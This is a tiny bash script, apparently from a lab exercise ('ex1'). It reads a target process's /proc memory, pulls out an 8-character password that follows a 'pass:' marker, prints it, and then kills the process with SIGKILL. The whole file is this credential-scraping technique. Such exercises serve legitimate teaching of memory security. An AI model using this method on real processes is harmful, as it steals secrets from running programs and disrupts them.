
#!/bin/bash

pid=$(cat /tmp/ex1.pid)
password=$(xxd -s $(expr `grep -a -b "pass:" /proc/$pid/mem | head -n1 | cut -d":" -f1`) -l 8 /proc/$pid/mem | grep -oE '[[:print:]]{8}')
echo "Password: $password"
kill -SIGKILL $pid

